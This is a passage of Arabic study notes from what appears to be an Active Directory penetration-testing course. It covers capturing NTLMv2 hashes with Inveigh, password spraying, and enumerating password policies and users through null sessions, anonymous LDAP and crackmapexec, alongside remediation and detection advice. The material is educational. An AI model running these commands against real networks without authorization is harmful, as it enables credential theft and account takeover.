(Get-Command Invoke-Inveigh).Parameters
```

هيظهر ليستة كبيرة جدًا فيها كل الـ Options اللي نقدر نستخدمها أثناء تشغيل Inveigh.

---

## تشغيل Inveigh

لتشغيل الأداة مع تفعيل:

- LLMNR Spoofing
- NBNS Spoofing
- Console Output
- File Output

نستخدم:

```powershell
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### شرح الـ Parameters

### `-LLMNR Y`

يفعل LLMNR Spoofing.

يعني الأداة ترد على طلبات LLMNR.

---

### `-NBNS Y`

يفعل NetBIOS Name Service Spoofing.

---

### `-ConsoleOutput Y`

يعرض كل الأحداث مباشرة على الشاشة.

---

### `-FileOutput Y`

يحفظ النتائج داخل ملفات Log.

---

## أول ما الأداة تشتغل

هتظهر معلومات كتير، أهمها:

```text
Primary IP Address = 172.16.5.25
```

وده عنوان الـ IP بتاع جهاز الـ Attacker.

---

بعدها:

```text
Spoofer IP Address = 172.16.5.25
```

وده الـ IP اللي هيستخدمه أثناء الرد على الضحايا.

---

بعدها هيعرض البروتوكولات المفعلة والمعطلة.

مثلاً:

```text
LLMNR Spoofer = Enabled
```

يعني هيعمل Spoofing على LLMNR.

---

```text
NBNS Spoofer = Enabled
```

يعني هيعمل Spoofing على NBNS.

---

```text
DNS Spoofer = Enabled
```

هيقدر يرد على بعض طلبات DNS.

---

```text
SMB Capture = Enabled
```

هيجمع Authentication اللي تيجي عن طريق SMB.

---

```text
HTTP Capture = Enabled
```

هيجمع Authentication الخاصة بـ HTTP.

---

```text
WPAD Response = Enabled
```

هيستجيب لطلبات WPAD.

---

## رسالة الخطأ

هيظهر:

```text
Error starting HTTP listener
```

وده معناه إن Port 80 مستخدم بالفعل أو Windows مانع الأداة تفتحه.

وده طبيعي ومش بيمنع باقي الهجوم من إنه يشتغل.

---

## بعد ثواني

هنبدأ نشوف Requests جاية من أجهزة الضحايا.

مثلاً:

```text
LLMNR request for academy-ea-web0
```

وده معناه إن جهاز داخل الشبكة بيدور على Host اسمه:

```text
academy-ea-web0
```

---

بعدها مباشرة:

```text
response sent
```

يعني Inveigh رد على الضحية وقاله:

"أنا الـ Host اللي بتدور عليه."

وبكده يبدأ الـ Authentication.

---

## بعدها

هنلاقي:

```text
SMB negotiation request detected
```

يعني الضحية بدأت تعمل اتصال SMB.

---

بعدها:

```text
NTLM challenge sent
```

وده بداية عملية الـ NTLM Authentication.

ومن هنا الأداة تبدأ تجمع الـ Hash.

---

## نسخة C#

الكاتب بيقول إن نسخة PowerShell مبقاش بيتم تطويرها.

أما النسخة اللي بيتضافلها تحديثات باستمرار فهي:

**InveighZero**

المكتوبة بـ C#.

ودي هي النسخة الموصى باستخدامها.

---

## تشغيل نسخة C#

بعد ما تكون Compile أو موجودة جاهزة:

```powershell
.\Inveigh.exe
```

---

## أول تشغيل

الأداة هتعرض كل الخدمات اللي شغالة افتراضيًا.

أي خدمة قدامها:

```text
[+]
```

يبقى مفعلة.

وأي خدمة قدامها:

```text
[ ]
```

تبقى غير مفعلة.

---

مثال:

```text
[+] LLMNR Packet Sniffer
```

يعني بيسمع Requests الخاصة بـ LLMNR.

---

```text
[+] LDAP Listener
```

يعني عامل Listener على LDAP.

---

```text
[+] SMB Packet Sniffer
```

بيتابع اتصالات SMB.

---

```text
[ ] NBNS
```

يعني NBNS مش شغال بالإعدادات الافتراضية.

---

```text
[ ] HTTPS
```

يعني HTTPS Listener مش شغال.

---

## أثناء التشغيل

هنشوف رسائل زي:

```text
LLMNR(A) request
```

يعني جهاز بيسأل عن IPv4 Address.

---

ولو ظهر:

```text
LLMNR(AAAA)
```

فده معناه إنه بيسأل عن IPv6 Address.

وفي المثال الأداة تجاهلت النوع ده لأنه غير مفعل.

---

## Interactive Console

أثناء تشغيل Inveigh هيظهر:

```text
Press ESC to enter/exit interactive console
```

لو ضغطنا:

ESC

هندخل Console داخلي خاص بالأداة.

منه نقدر نشوف:

- الـ Hashes
- الـ Logs
- الـ Credentials
- نوقف الأداة
- نعدل بعض الإعدادات

بدون ما نقفل البرنامج.

---

## HELP

لو كتبنا:

```text
HELP
```

هيظهر كل أوامر الـ Console.

---

## أهم أوامر الـ Console

### GET NTLMV2

يعرض كل الـ NTLMv2 Hashes اللي اتجمعت.

---

### GET NTLMV2UNIQUE

يعرض Hash واحد فقط لكل User.

وده مفيد علشان متشوفش نفس الـ User مكرر عشرات المرات.

---

### GET NTLMV2USERNAMES

يعرض:

- Username
- Host
- Source IP

بدون عرض الـ Hash بالكامل.

وده مفيد لو عايز تعرف المستخدمين الموجودين في الشبكة.

---

### GET CLEARTEXT

يعرض أي Credentials وصلت بصيغة واضحة (Plaintext) لو تم التقاطها.

---

### GET LOG

يعرض الـ Logs الخاصة بالأداة.

---

### STOP

يقفل Inveigh.

---

## مثال على Hash

الأداة عرضت:

```text
backupagent::INLANEFREIGHT:...
```

وده NetNTLMv2 Hash خاص بالمستخدم:

```text
backupagent
```

وبرضه ظهر Hash تاني للمستخدم:

```text
forend
```

يعني قدرنا نجمع أكتر من User.

---

## عرض أسماء المستخدمين فقط

لما استخدمنا:

```text
GET NTLMV2USERNAMES
```

ظهر:

- backupagent
- forend
- clusteragent
- wley
- svc_qualys

وده بيساعدنا نحدد أي الحسابات تستحق نحاول نكسر الـ Hash الخاص بيها باستخدام Hashcat.

---

## Remediation

علشان نمنع الهجوم ده، الكتاب اقترح أكتر من حل.

---

## تعطيل LLMNR

من خلال:

```text
Group Policy

Computer Configuration
→ Administrative Templates
→ Network
→ DNS Client
→ Turn OFF Multicast Name Resolution
```

وبعدين نفعل الخيار.

وبكده Windows مش هيستخدم LLMNR.

---

## تعطيل NBT-NS

مش بيتقفل من Group Policy مباشرة.

لازم يتقفل من كل جهاز.

الخطوات:

1. Network and Sharing Center.
2. Change Adapter Settings.
3. Properties.
4. Internet Protocol Version 4.
5. Advanced.
6. WINS.
7. Disable NetBIOS over TCP/IP.

---

## تعطيل NBT-NS باستخدام PowerShell

بدل ما تعمل ده يدويًا على كل جهاز، ممكن تستخدم Script:

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces"

Get-ChildItem $regkey | ForEach {
    Set-ItemProperty -Path "$regkey\$($_.PSChildName)" -Name NetbiosOptions -Value 2
}
```

السكريبت بيغير قيمة Registry الخاصة بكل Network Interface ويعطل NetBIOS.

---

## نشر الـ Script على كل أجهزة الدومين

نقدر نحط الـ Script داخل:

```text
SYSVOL
```

ونربطه بـ Group Policy Startup Script.

ولما الأجهزة تعمل Restart، السكريبت يشتغل تلقائيًا ويعطل NBT-NS على كل الأجهزة.

---

## حلول إضافية

الكتاب ذكر كمان:

- فلترة Traffic الخاصة بـ LLMNR و NetBIOS.
- تفعيل SMB Signing لمنع NTLM Relay.
- استخدام IDS/IPS لمراقبة الشبكة.
- تقسيم الشبكة (Network Segmentation).

---

## Detection

لو مش قادرين نعطل LLMNR أو NBT-NS، لازم نراقب وجود الهجوم.

من طرق الاكتشاف:

- مراقبة Traffic على:

```text
UDP 5355
```

و

```text
UDP 137
```

---

- مراقبة Event IDs:

```text
4697
7045
```

---

- مراقبة قيمة Registry:

```text
HKLM\Software\Policies\Microsoft\Windows NT\DNSClient
```

ولو:

```text
EnableMulticast = 0
```

يبقى LLMNR متعطل.

---

## بعد كده؟

بعد ما نجمع الـ Hashes، مش بنجري نكسرهم كلهم.

الأفضل الأول نستخدم أدوات زي:

- BloodHound

علشان نعرف أي المستخدمين عندهم صلاحيات مهمة.

بعدها نحاول نكسر الـ Hashes الخاصة بالحسابات المهمة فقط باستخدام Hashcat.

ولو قدرنا نجيب Password لحساب مميز، نبدأ نوسع سيطرتنا داخل الـ Active Directory.

ولو مقدرناش نكسر أي Hash، يبقى ننتقل للمرحلة اللي بعدها وهي:

**Password Spraying**.


# Layer 8
## Password Spraying Overview

بعد ما خلصنا مرحلة الـ Enumeration وجمعنا أكبر قدر ممكن من المعلومات عن الشبكة، ممكن نبدأ نجرب طريقة اسمها **Password Spraying** علشان نحاول ناخد أول Access داخل الدومين.

الهدف من Password Spraying هو إننا نحصل على Username و Password صحيحين ونستخدمهم كـ Foothold داخل الشبكة.

---

## يعني إيه Password Spraying؟

Password Spraying هو هجوم بنجرب فيه:

**Password واحدة شائعة**

على

**عدد كبير من المستخدمين.**

يعني مثلًا بدل ما نجرب 100 Password على User واحد، نجرب Password واحدة على 100 User.

وده بيقلل احتمالية قفل الحسابات (Account Lockout).

---

## منين بنجيب أسماء المستخدمين؟

الكتاب بيقول إن أسماء المستخدمين ممكن تيجي من أكتر من مصدر، زي:

- مرحلة OSINT.
- مرحلة Enumeration.
- LinkedIn.
- Email Addresses.
- Usernames اللي جمعناها أثناء الاختبار.

كل معلومة بنجمعها أثناء الـ Pentest ممكن نستخدمها بعد كده في Password Spraying.

---

## الـ Penetration Test عملية مستمرة

الكاتب بيأكد إن اختبار الاختراق مش عبارة عن خطوات ثابتة.

إنت طول الوقت:

- بتجمع معلومات.
- بتجرب Techniques جديدة.
- بترجع تعيد Enumeration.
- تستخدم المعلومات الجديدة في هجمات مختلفة.

يعني كل ما تكتشف معلومة، ممكن تفتحلك باب لهجوم جديد.

---

## استغلال الوقت

الكاتب بيقول إن أغلب العمليات بتاخد وقت طويل، زي:

- Scanning.
- Cracking Hashes.
- Enumeration.

علشان كده لازم تستغل الوقت.

مثال:

لو Responder شغال ومستني حد يبعت Authentication، متقعدش مستنيه.

ابدأ في نفس الوقت تعمل Password Spraying.

وده بيخليك تخلص الـ Assessment أسرع.

---

## Story Time

الكاتب بدأ يحكي تجربتين حصلوا معاه أثناء اختبارات اختراق حقيقية.

كل الأمثلة كانت:

- Grey Box Assessment.
- عنده Internal Access.
- معاه Linux VM.
- وعارف فقط الـ IP Ranges.

مفيش Credentials ولا معلومات إضافية.

---

## Scenario 1

في أول اختبار، الكاتب عمل كل الـ Enumeration المعتادة.

ودور على حاجات زي:

- SMB NULL Session.
- LDAP Anonymous Bind.

لكن ملقاش أي حاجة تساعده يجيب قائمة بالمستخدمين.

---

## يعني إيه SMB NULL Session؟

دي Session بتسمح لأي شخص يدخل على SMB بدون Username أو Password.

ولو موجودة، ممكن نطلع منها Users أو Shares.

لكن هنا كانت مقفولة.

---

## يعني إيه LDAP Anonymous Bind؟

يعني نقدر نسأل Active Directory عن المستخدمين بدون Authentication.

وده برضه كان مقفول.

---

## استخدم Kerbrute

بما إنه معرفش يجيب Users بالطريقتين دول، استخدم:

**Kerbrute**

علشان يعمل Username Enumeration.

---

## جاب الـ Usernames منين؟

الكاتب جمع أسماء المستخدمين من مصدرين.

### أول مصدر

Repository على GitHub اسمه:

```text
statistically-likely-usernames
```

وده فيه أسماء مستخدمين شائعة.

زي:

- jsmith
- mjohnson
- ajones

---

### ثاني مصدر

LinkedIn.

دخل على صفحة الشركة وشاف أسماء الموظفين.

ومنها استنتج أسماء المستخدمين المحتملة.

---

## بعد كده

دمج الليستتين مع بعض.

وبعدين استخدم Kerbrute.

علشان يعرف أي User فعلاً موجود داخل الدومين.

---

## بعد ما عرف الـ Users الصحيحة

استخدم نفس الأداة في:

Password Spraying.

وجرب Password واحدة فقط.

وهي:

```text
Welcome1
```

---

## النتيجة

قدر يلاقي:

حسابين شغالين بنفس الباسورد.

رغم إنهم كانوا Low Privileged Users.

لكن ده كان كفاية.

---

## ليه كان كفاية؟

لأنه استخدم الحسابات دي في تشغيل:

BloodHound.

ومن خلال BloodHound قدر يلاقي Attack Paths.

وفي النهاية وصل لـ:

Domain Compromise.

يعني سيطر على الدومين بالكامل.

---

## Scenario 2

في اختبار تاني.

جرب نفس الطريقة.

لكن Kerbrute مع LinkedIn.

مجابوش أي نتيجة.

---

## بدأ يفكر بطريقة مختلفة

دخل على Google.

ودور على:

PDFs

خاصة بالشركة.

---

## ليه PDF؟

لأن ملفات PDF غالبًا بيكون فيها Metadata.

زي:

- Author.
- Creator.
- Username.

---

## اكتشف حاجة مهمة

فتح خصائص أربع ملفات PDF.

ولقى إن:

Author

كان بالشكل:

```text
F9L8
```

يعني Username مكون من:

- 4 خانات.
- كل خانة حرف كبير أو رقم.

مثال:

```text
AB12
```

أو

```text
X9T4
```

---

## ليه دي معلومة خطيرة؟

لأنه عرف شكل الـ Username.

وبالتالي يقدر يولد كل الاحتمالات.

---

## Bash Script

استخدم Script بسيط:

```bash
#!/bin/bash

for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
do
    echo $x
done
```

---

## السكريبت بيعمل إيه؟

بينشئ كل الاحتمالات الممكنة المكونة من:

- A-Z
- 0-9

بطول أربع خانات.

---

## الناتج

طلع:

```text
1,679,616
```

Username مختلف.

---

## بعد كده

استخدم Kerbrute.

وجرب كل الأسماء.

---

## النتيجة

قدر يعرف:

كل المستخدمين الموجودين داخل الدومين تقريبًا.

---

## ليه؟

لأن الشركة كانت بتستخدم Pattern ثابت للـ Usernames.

وده خلى Enumeration أسهل جدًا.

---

## بعد كده

عمل Password Spraying.

وقدر يجيب Passwords صحيحة لبعض الحسابات.

---

## النهاية

استخدم Attack Chain معقدة.

اشتملت على:

- Resource-Based Constrained Delegation (RBCD).
- Shadow Credentials Attack.

وفي النهاية سيطر بالكامل على الـ Domain.

---

## Password Spraying Considerations

رغم إن Password Spraying مفيد جدًا.

لكن استخدامه بشكل خاطئ ممكن يسبب مشاكل كبيرة.

أهمها:

قفل عدد ضخم من الحسابات.

وده ممكن يوقف شغل الشركة.

---

## الفرق بين Brute Force و Password Spraying

### Brute Force

بيجرب:

Passwords كتير

على

User واحد.

وده غالبًا يؤدي بسرعة إلى Account Lockout.

---

### Password Spraying

بيجرب:

Password واحدة

على

Users كتير.

وده أقل خطورة.

---

## مثال

بدل:

```text
Ahmed

123456
Welcome1
Password1
Passw0rd
Winter2022
```

وده Brute Force.

نعمل:

```text
Ahmed     Welcome1
Mohamed   Welcome1
Sara      Welcome1
Ali       Welcome1
```

وبعدين نستنى.

بعد فترة نجرب:

```text
Ahmed     Passw0rd
Mohamed   Passw0rd
Sara      Passw0rd
Ali       Passw0rd
```

وهكذا.

---

## ليه بنستنى؟

علشان منوصلش لعدد المحاولات اللي يقفل الحساب.

الكتاب عامل Delay بين كل Password.

وده أهم جزء في Password Spraying.

---

## Password Policy

كل Domain بيكون ليه سياسة خاصة بالباسورد.

مثلاً:

بعد:

5

محاولات غلط.

الحساب يتقفل.

---

## مثال مشهور

الكتاب ذكر Policy شائعة جدًا.

- 5 محاولات خاطئة.
- الحساب يتقفل.
- بعد 30 دقيقة يفتح تلقائيًا.

---

## في شركات تانية

الحساب ممكن يفضل مقفول.

لحد ما:

Administrator

يفتحه بنفسه.

وده أخطر.

---

## لو مش عارف الـ Password Policy

الأفضل تستنى:

عدة ساعات

بين كل Password.

علشان تتأكد إن عداد المحاولات رجع للصفر.

---

## الأفضل

لو قدرت تجيب Password Policy قبل الهجوم.

يبقى أحسن.

لأنك هتعرف:

- كام محاولة مسموحة.
- مدة الـ Lockout.
- إمتى تكرر المحاولة.

وده يقلل جدًا احتمال قفل الحسابات.

---

## لو مقدرتش تجيبها

الكاتب بيقول:

ممكن تعمل محاولة واحدة فقط.

بـ Password ضعيفة ومشهورة.

كآخر محاولة لو كل الطرق التانية فشلت.

---

## لو معاك User بالفعل

لو عندك:

- Foothold.
- أو العميل مديلك User.

يبقى تقدر تجمع Password Policy من داخل الدومين بطرق مختلفة.

وده هيتشرح في الجزء اللي بعده.


# Layer 9
## Enumerating & Retrieving Password Policies

الجزء ده بيتكلم عن إزاي كـ Pentester أو Red Teamer تعرف **Password Policy** الخاصة بالدومين (Active Directory Domain).

يعني تعرف:
- أقل عدد حروف للباسورد.
- هل لازم الباسورد يكون Complex ولا لأ.
- بعد كام محاولة غلط الأكونت يتقفل.
- الأكونت بيفضل مقفول قد إيه.
- الباسورد بيتغير كل كام يوم.

كل المعلومات دي مهمة جدًا قبل أي Password Spraying Attack لأنك متقفلش حسابات المستخدمين.

---

## ليه Password Policy مهمة؟

تخيل إن الشركة عاملة:

- Lockout Threshold = 3

وأنت جربت 5 Passwords.

كل اليوزرز هيتقفلوا.

وده يعتبر كارثة أثناء الـ Pentest.

لكن لو عرفت الـ Policy الأول هتعرف:

- أجرب كام Password.
- أستنى قد إيه بين كل محاولة.
- إيه الباسوردات المنطقية اللي أجربها.

---

## أول طريقة: عندك Credentials

يعني معاك Username و Password صالحين.

مثلاً:

```bash
crackmapexec smb 172.16.5.5 \
-u avazquez \
-p Password123 \
--pass-pol
```

---

## نشرح الأمر

### crackmapexec

أداة Enumeration ضخمة.

بتستخدمها مع:

- SMB
- LDAP
- WinRM
- MSSQL
- وغيرها.

---

### smb

يعني هنستخدم بروتوكول SMB.

---

### 172.16.5.5

IP بتاع الـ Domain Controller.

---

### -u

اليوزر.

```bash
-u avazquez
```

---

### -p

الباسورد.

```bash
-p Password123
```

---

### --pass-pol

يعني:

هاتلي Password Policy.

---

## الناتج

```text
Minimum password length: 8
```

يعني أقل باسورد لازم يكون 8 حروف.

---

```text
Password history length: 24
```

يعني آخر 24 باسورد المستخدم استخدمهم.

مينفعش يرجع يستخدم واحد منهم.

---

```text
Maximum password age: Not Set
```

يعني الباسورد ملوش Expiration.

مش لازم يتغير.

---

## Password Complexity Flags

```text
Password Complex: 1
```

يعني Complexity Enabled.

يعني الباسورد لازم يحتوي على 3 من 4:

- Uppercase
- Lowercase
- Number
- Symbol

مثال:

```
Password1
```

فيه:

- Uppercase
- Lowercase
- Number

يبقى Complex.

---

## Minimum password age

```text
1 day
```

يعني مينفعش تغير الباسورد مرتين في نفس اليوم.

---

## Reset Account Lockout Counter

```text
30 minutes
```

لو المستخدم غلط في الباسورد مرتين.

واستنى 30 دقيقة.

العداد يرجع صفر.

---

## Locked Account Duration

```text
30 minutes
```

لو الحساب اتقفل.

هيفضل مقفول 30 دقيقة.

---

## Account Lockout Threshold

```text
5
```

بعد خمس Passwords غلط.

الأكونت يتقفل.

---

## SMB NULL Session

دلوقتي مفيش Credentials.

ولا Username.

ولا Password.

هل نقدر نعرف Password Policy؟

أحيانًا...

أيوه.

---

## يعني إيه NULL Session؟

يعني تعمل اتصال بـ SMB بدون Authentication.

يعني:

Username = ""

Password = ""

---

زمان في Windows Server القديمة.

Microsoft كانت سامحة بالحركة دي.

عشان الـ Compatibility.

لكن دلوقتي المفروض تكون مقفولة.

---

## ليه خطيرة؟

لأنك ممكن تعرف:

- Users
- Groups
- Computers
- Password Policy
- Domain Info

بدون Login.

---

## أدوات تستخدمها

- rpcclient
- enum4linux
- enum4linux-ng
- CrackMapExec

---

## rpcclient

الاتصال:

```bash
rpcclient -U "" -N 172.16.5.5
```

---

### نشرح

### -U ""

Username فاضي.

---

### -N

No Password.

---

## بعد الدخول

```bash
querydominfo
```

---

## بيجيب

```text
Domain
```

اسم الدومين.

---

```text
Total Users
```

عدد المستخدمين.

---

```text
Server Role
```

هل الجهاز:

- Domain Controller
- Member Server
- Workstation

---

## بعد كده

```bash
getdompwinfo
```

---

هيطلع

```text
min_password_length:8
```

---

```text
password_properties
```

وهتعرف هل Complexity شغالة.

---

## enum4linux

الأداة دي عبارة عن Wrapper.

يعني بتستخدم جواها:

- rpcclient
- smbclient
- net
- nmblookup

كلهم مرة واحدة.

---

تشغيلها:

```bash
enum4linux -P 172.16.5.5
```

---

### -P

هات Password Policy فقط.

---

## هتلاقي

```text
Minimum password length
```

---

```text
History
```

---

```text
Lockout Threshold
```

---

```text
Password Complexity
```

كلها في Output مرتب.

---

## enum4linux-ng

دي نسخة أحدث.

مكتوبة بـ Python.

---

مميزاتها:

- أسرع.
- Output أوضح.
- JSON Export.
- YAML Export.

---

تشغيلها

```bash
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

---

## -oA

يعني Export.

هيعمل:

```
ilfreight.json

ilfreight.yaml
```

---

## ليه مفيد؟

بعد كده تقدر تستخدم الملفات دي في Scripts.

أو أدوات تانية.

---

## JSON

هنلاقي مثلاً

```json
"null_session_possible":true
```

يعني:

السيرفر بيسمح بـ NULL Session.

وده Misconfiguration.

---

## Windows NULL Session

من Windows.

```cmd
net use \\DC01\ipc$ "" /u:""
```

---

## نشرح

### net use

بيعمل Mapping أو Connection.

---

### \\DC01\ipc$

IPC Share.

دي Share خاصة بالـ RPC Communication.

---

### ""

Password فاضي.

---

### /u:""

Username فاضي.

---

لو نجحت.

يبقى فيه NULL Session.

---

## Error 1331

```text
Account Disabled
```

يعني الحساب Disabled.

---

## Error 1326

```text
Username or Password incorrect
```

يعني Login Failed.

---

## Error 1909

```text
Account Locked
```

يعني الحساب متقفل بسبب Password Policy.

---

## LDAP Anonymous Bind

طريقة تانية.

بدل SMB.

نستخدم LDAP.

---

## LDAP

البروتوكول الأساسي اللي Active Directory بيستخدمه.

للبحث عن:

- Users
- Groups
- Computers
- Policies

---

## Anonymous Bind

يعني تعمل LDAP Search بدون Login.

---

في Windows الحديثة.

المفروض مقفولة.

لكن ساعات Admin يفتحها بالغلط.

---

## ldapsearch

```bash
ldapsearch \
-h 172.16.5.5 \
-x \
-b "DC=INLANEFREIGHT,DC=LOCAL"
```

---

### -h

Hostname.

---

### -x

Simple Authentication.

---

### -b

Base DN.

يعني:

ابدأ البحث من هنا.

---

## الناتج

```text
minPwdLength:8
```

أقل باسورد.

---

```text
lockoutThreshold:5
```

عدد المحاولات.

---

```text
pwdHistoryLength:24
```

عدد Password History.

---

## من Windows

لو أنت Logged In.

تقدر تستخدم:

```cmd
net accounts
```

---

هيطلع

```text
Minimum password length
```

---

```text
Maximum password age
```

---

```text
Lockout threshold
```

---

```text
Lockout duration
```

كل المعلومات المهمة.

---

## PowerView

أداة PowerShell شهيرة.

```powershell
Import-Module .\PowerView.ps1

Get-DomainPolicy
```

---

هترجع

```text
MinimumPasswordLength
```

---

```text
PasswordComplexity
```

---

```text
PasswordHistorySize
```

---

```text
LockoutBadCount
```

---

```text
LockoutDuration
```

---

```text
ResetLockoutCount
```

كلها في Object منظم.

---

## تحليل الـ Password Policy

نفترض:

```
Minimum Length = 8

Complexity = Enabled

Threshold = 5

Duration = 30 Minutes
```

---

## معنى Minimum Length

أي Password أقل من 8.

مرفوض.

---

## معنى Complexity

لازم يحتوي على 3 أنواع من:

- Uppercase
- Lowercase
- Number
- Symbol

---

## معنى Threshold

بعد 5 Passwords غلط.

الحساب يتقفل.

---

## معنى Duration

الحساب يفضل مقفول 30 دقيقة.

---

## ليه الكلام ده مهم؟

في Password Spraying.

بدل ما تجرب 100 Password.

هتجرب مثلاً:

```
Welcome1

Summer2025

Winter2025
```

بس.

وبعدين تستنى.

---

## ليه Welcome1 مثال مشهور؟

لأنه:

- 8 Characters أو أكثر.
- Uppercase.
- Lowercase.
- Number.

وبيحقق الـ Complexity.

وفي شركات كتير المستخدمين بيختاروه.

---

## Default Password Policy

لما تنشئ Domain جديد.

Windows بيحط افتراضيًا:

| Policy                | Default  |
| --------------------- | -------- |
| Password History      | 24       |
| Maximum Age           | 42 Days  |
| Minimum Age           | 1 Day    |
| Minimum Length        | 7        |
| Complexity            | Enabled  |
| Reversible Encryption | Disabled |
| Lockout Threshold     | 0        |
| Lockout Duration      | Not Set  |

---

## يعني إيه Lockout Threshold = 0 ؟

يعني مفيش Lockout خالص.

مهما تغلط.

الحساب مش هيتقفل.

وده يعتبر إعداد ضعيف جدًا لأنه بيسهل هجمات الـ Password Guessing والـ Password Spraying.

---

## Next Step

بعد ما تعرف الـ Password Policy.

الخطوة اللي بعدها هي:

1. تجمع Usernames.
2. تختار Password أو اتنين فقط.
3. تعمل Password Spraying.
4. تلتزم بالـ Lockout Policy ومتقفلش أي حساب.

وده السبب إن معرفة الـ Password Policy تعتبر من أول وأهم خطوات أي هجوم Password Spraying ناجح.


# Layer 10
## Password Spraying - Making a Target User List

بعد ما عرفنا في الجزء اللي فات إزاي نجيب الـ **Password Policy**، دلوقتي جه وقت أهم خطوة قبل تنفيذ Password Spraying Attack.

وهي:

**نعمل قائمة باليوزرز (Target User List).**

لأن الـ Password Spraying بيعتمد على إنك:

- تجرب Password واحد.
- على عدد كبير من اليوزرز.

فلازم الأول يكون عندك Usernames صحيحة.

---

## يعني إيه Target User List؟

هي عبارة عن ملف فيه أسماء المستخدمين الموجودة داخل الـ Active Directory.

مثلاً:

```text
administrator
john
ahmed
mohamed
itadmin
```

بعد كده هتستخدم الملف ده مع أدوات الـ Password Spraying.

---

## ليه لازم تكون القائمة صحيحة؟

لو القائمة كلها Users مش موجودين أصلاً.

يبقى:

- الهجوم هيفشل.
- هتضيع وقت.
- ممكن تعمل Noise في الـ Logs.

عشان كده بنحاول نجيب Users الحقيقيين.

---

## إزاي نجيب قائمة المستخدمين؟

الدرس ذكر أكتر من طريقة.

---

### الطريقة الأولى

SMB NULL Session

لو السيرفر بيسمح بيها.

---

### الطريقة الثانية

LDAP Anonymous Bind

---

### الطريقة الثالثة

Kerbrute

عن طريق Kerberos.

---

### الطريقة الرابعة

لو معاك Credentials

سواء:

- Username / Password
- أو حصلت عليهم بأي طريقة.

---

### الطريقة الخامسة

OSINT

زي:

- LinkedIn
- Emails
- أسماء الموظفين

لو مفيش أي Access.

---

## ليه Password Policy مهمة قبل الـ Spray؟

افترض إنك عرفت:

```
Minimum Length = 10
```

يبقى مينفعش تضيع وقت في Password:

```
Welcome1
```

لأنه 8 حروف.

مستحيل ينجح.

---

ولو عرفت:

```
Complexity Enabled
```

يبقى متجربش

```
password
```

لأنه مش Complex.

---

ولو عرفت

```
Threshold = 5
```

يبقى متجربش أكتر من 2 أو 3 Passwords.

---

## لو معرفتش Password Policy؟

الكاتب بيقول:

اسأل العميل.

وده طبيعي في Pentest.

---

لو رفض يقولك.

اعمل محاولة واحدة فقط.

أو

استنى ساعات بين كل Password.

علشان متقفلش الحسابات.

---

## لازم تسجل كل حاجة

ودي نقطة مهمة جدًا.

الكاتب بيقول:

سجل كل حاجة بتعملها.

---

## إيه اللي يتسجل؟

### الحسابات

مين اليوزرز اللي استهدفتهم.

---

### الـ Domain Controller

الهجوم كان على أنهي DC.

---

### الوقت

الساعة.

---

### التاريخ

اليوم.

---

### Passwords

إيه Password جربتها.

---

## ليه؟

علشان:

- متكررش نفس المحاولة.
- تعرف عملت إيه.
- لو العميل لقى Login Attempts.
- تقدر تقوله دي كانت بتاعتي.

وده Professional جدًا.

---

## SMB NULL Session to Pull User List

دلوقتي هنستخدم NULL Session.

مش علشان Password Policy.

لكن علشان نجيب Users.

---

## الفكرة

لو السيرفر بيسمح بـ NULL Session.

يبقى نقدر نسحب كل Users.

بدون Login.

---

## لو عندك Credentials

يبقى أسهل بكتير.

تقدر تعمل Query لـ Active Directory مباشرة.

---

## لو معندكش Credentials

قدامك 3 احتمالات.

---

### الأول

NULL Session

---

### الثاني

LDAP Anonymous Bind

---

### الثالث

OSINT.

---

## الكاتب قال نقطة مهمة

لو أنت واخد SYSTEM Access.

على جهاز داخل الدومين.

تقدر تعمل Enumeration.

---

## ليه؟

لأن الكمبيوتر نفسه ليه Account.

اسمه

```
COMPUTER$
```

وده بيتعامل كأنه User.

ويقدر يستعلم من Active Directory.

---

## لو مفيش أي Access

يبقى تبدأ تجمع معلومات من الإنترنت.

مثلاً:

LinkedIn.

Emails.

أسماء الموظفين.

---

## أدوات تقدر تستخدمها

- enum4linux
- rpcclient
- CrackMapExec

---

## enum4linux

الأمر:

```bash
enum4linux -U 172.16.5.5
```

---

## نشرح

### enum4linux

أداة Enumeration.

---

### -U

يعني:

هات Users فقط.

---

### 172.16.5.5

IP بتاع الـ DC.

---

## الناتج

```text
administrator

guest

krbtgt

lab_adm

htb-student

avazquez
```

كل User في سطر.

---

لكن الحقيقة.

الأداة بتطلع Output كبير.

---

عشان كده استخدموا

```bash
grep
```

---

## grep

```bash
grep "user:"
```

يعني:

طلع السطور اللي فيها

```
user:
```

بس.

---

بعدها

```bash
cut
```

---

## cut

دي أداة بتقص جزء من النص.

---

```bash
cut -f2 -d"["
```

يعني:

اقسم السطر عند

```
[
```

وهات الجزء التاني.

---

بعدها

```bash
cut -f1 -d"]"
```

يعني:

قص عند

```
]
```

وهات الجزء الأول.

---

مثلاً

لو السطر

```text
user:[administrator]
```

يبقى الناتج

```text
administrator
```

---

وده يخليك تطلع List نظيفة.

---

## rpcclient

الاتصال

```bash
rpcclient -U "" -N 172.16.5.5
```

---

بعد الدخول

```bash
enumdomusers
```

---

## معنى enumdomusers

اختصار

Enumerate Domain Users.

يعني:

اعرض كل Users.

---

## الناتج

```text
user:[administrator]
```

---

```text
rid:[0x1f4]
```

---

## يعني إيه RID؟

RID

Relative Identifier.

---

كل User في Active Directory.

له SID.

آخر جزء في الـ SID.

اسمه RID.

---

مثلاً

```
S-1-5-21-XXX-XXX-500
```

الـ

```
500
```

هو RID.

---

Administrator.

RID بتاعه دائمًا 500.

---

Guest.

RID = 501.

---

KRBTGT.

RID = 502.

---

وده بيساعد أحيانًا في التعرف على الحسابات المهمة.

---

## CrackMapExec --users

الأمر

```bash
crackmapexec smb 172.16.5.5 --users
```

---

## --users

يعني:

اعرض Users.

---

## الجميل في CrackMapExec

مش بيطلع Users بس.

---

بيطلع كمان

```text
badpwdcount
```

---

## يعني إيه badpwdcount؟

عدد مرات إدخال Password غلط.

---

مثلاً

```text
badpwdcount : 3
```

يعني المستخدم غلط 3 مرات.

---

ولو الـ Lockout

5

يبقى لو جربت عليه مرتين.

هيتقفل.

---

عشان كده ممكن تشيله من الـ Target List.

---

## baddpwdtime

آخر مرة Password غلط.

---

مثلاً

```text
2022-02-17
```

يبقى آخر محاولة كانت في التاريخ ده.

---

## ليه المعلومة دي مهمة؟

